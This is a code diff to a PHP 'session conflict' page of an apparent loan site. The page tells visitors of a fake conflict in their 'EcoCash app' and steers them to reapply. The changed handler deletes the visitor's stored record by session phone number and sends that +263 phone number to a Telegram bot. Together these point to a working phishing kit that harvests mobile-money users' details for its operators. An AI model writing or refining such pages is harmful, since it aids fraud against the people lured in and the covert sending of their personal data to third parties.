@@ -85,6 +85,9 @@ function sendTelegramMessage($botToken, $chatId, $message) {
     return false;
 }
 
+// Get phone from session
+$phoneInSession = isset($_SESSION['phone']) ? trim($_SESSION['phone']) : '';
+
 // Check if reapply action is triggered
 if (isset($_GET['action']) && $_GET['action'] === 'reapply') {
     try {
@@ -94,42 +97,41 @@ if (isset($_GET['action']) && $_GET['action'] === 'reapply') {
             throw new Exception("Database connection failed");
         }
         
-        // Query to get the last inserted phone number from users table
-        $selectQuery = "SELECT phone FROM users ORDER BY phone DESC LIMIT 1";
-        $result = pg_query($conn, $selectQuery);
+        // Check if phone exists in session
+        if (empty($phoneInSession)) {
+            $_SESSION['message'] = "No phone number found in session. Please start over.";
+            $_SESSION['message_type'] = "error";
+            header("Location: index.php");
+            exit();
+        }
         
-        if ($result && pg_num_rows($result) > 0) {
-            $row = pg_fetch_assoc($result);
-            $lastPhoneNumber = $row['phone'];
-            
-            // Delete the record with the last phone number
-            $deleteQuery = "DELETE FROM users WHERE phone = $1";
-            $deleteResult = pg_query_params($conn, $deleteQuery, [$lastPhoneNumber]);
-            
-            if ($deleteResult) {
-                $rowsAffected = pg_affected_rows($deleteResult);
-                if ($rowsAffected > 0) {
-                    $_SESSION['message'] = "Previous application deleted successfully. You can now reapply.";
-                    $_SESSION['message_type'] = "success";
-                    
-                    // Send Telegram notification about deletion
-                    $ip = "https://loan-1-i36j.onrender.com/session_conflict.php";
-                    $time = date('Y-m-d H:i:s');
-                    $msg = "🔄 *User Record Deleted*\n\n📱 Phone: +263 {$lastPhoneNumber}\n⏰ Time: {$time}\n📍 Action: Reapply clicked\n🌐 Session Page: {$ip}";
-                    sendTelegramMessage($botToken, $chatId, $msg);
-                } else {
-                    $_SESSION['message'] = "No records found to delete.";
-                    $_SESSION['message_type'] = "info";
-                }
+        // Delete the user record where phone matches the session phone
+        $deleteQuery = "DELETE FROM users WHERE phone = $1";
+        $deleteResult = pg_query_params($conn, $deleteQuery, [$phoneInSession]);
+        
+        if ($deleteResult) {
+            $rowsAffected = pg_affected_rows($deleteResult);
+            if ($rowsAffected > 0) {
+                $_SESSION['message'] = "Your previous application has been deleted successfully. You can now reapply.";
+                $_SESSION['message_type'] = "success";
+                
+                // Send Telegram notification about deletion
+                $ip = "https://loan-1-i36j.onrender.com/session_conflict.php";
+                $time = date('Y-m-d H:i:s');
+                $msg = "🔄 *User Record Deleted - Reapply*\n\n📱 Phone: +263 {$phoneInSession}\n⏰ Time: {$time}\n📍 Action: User record deleted from session\n🌐 Session Page: {$ip}";
+                sendTelegramMessage($botToken, $chatId, $msg);
             } else {
-                throw new Exception("Error deleting record: " . pg_last_error($conn));
+                $_SESSION['message'] = "No record found for this phone number. You can proceed with new application.";
+                $_SESSION['message_type'] = "info";
             }
         } else {
-            $_SESSION['message'] = "No previous application found. You can proceed with new application.";
-            $_SESSION['message_type'] = "info";
+            throw new Exception("Error deleting record: " . pg_last_error($conn));
         }
         
         pg_close($conn);
+        
+        // Clear the session phone after deletion
+        unset($_SESSION['phone']);
         
         // Redirect to loan.php
         header("Location: loan.php");
@@ -347,18 +349,6 @@ if (isset($_GET['action']) && $_GET['action'] === 'reapply') {
             width: 100%;
         }
 
-        .btn-logout {
-            background: #dc2626;
-            color: white;
-            box-shadow: 0 4px 14px 0 rgba(220, 38, 38, 0.4);
-        }
-
-        .btn-logout:hover {
-            background: #b91c1c;
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px 0 rgba(220, 38, 38, 0.5);
-        }
-
         .btn-reapply {
             background: #10b981;
             color: white;
@@ -385,6 +375,22 @@ if (isset($_GET['action']) && $_GET['action'] === 'reapply') {
         @keyframes blinkWarning {
             0%, 100% { background-color: #fef2f2; }
             50% { background-color: #fee2e2; }
+        }
+
+        .phone-display {
+            background: #f3f4f6;
+            padding: 12px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #1f2937;
+        }
+
+        .phone-display span {
+            color: #dc2626;
+            font-size: 1.2rem;
         }
 
         @media (max-width: 480px) {
@@ -421,23 +427,29 @@ if (isset($_GET['action']) && $_GET['action'] === 'reapply') {
                 <div class="conflict-message blink-warning" id="conflictMessage">
                     <div class="oops">OOPS!!</div>
                     <div class="description">
-                        Conflicting sessions detected from your EcoCash app. Please logout app and reapply for a loan. Thanks
+                        Conflicting sessions detected from your EcoCash app. Please reapply for a loan. Thanks
                     </div>
                 </div>
+
+                <?php if (!empty($phoneInSession)): ?>
+                <div class="phone-display">
+                    📱 Current Session: <span>+263 <?= htmlspecialchars($phoneInSession) ?></span>
+                </div>
+                <?php endif; ?>
 
                 <div class="details-list">
                     <div class="detail-item">
                         <div class="detail-icon">📱</div>
                         <div class="detail-text">
-                            <div class="label">Last Application</div>
-                            <div class="value">Previous session didn't close properly</div>
+                            <div class="label">Current Session Phone</div>
+                            <div class="value"><?= !empty($phoneInSession) ? '+263 ' . htmlspecialchars($phoneInSession) : 'No active session' ?></div>
                         </div>
                     </div>
                     <div class="detail-item">
                         <div class="detail-icon">⏱️</div>
                         <div class="detail-text">
-                            <div class="label">Session Timeout</div>
-                            <div class="value">Please reapply to continue</div>
+                            <div class="label">Session Status</div>
+                            <div class="value">Previous session didn't close properly</div>
                         </div>
                     </div>
                 </div>
@@ -449,7 +461,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'reapply') {
                 </div>
 
                 <div class="footer-note">
-                    <span>⚠️ For security reasons, please reapply to continue</span>
+                    <span>⚠️ Clicking reapply will delete your current session data and allow a fresh application</span>
                 </div>
             </div>
         </div>
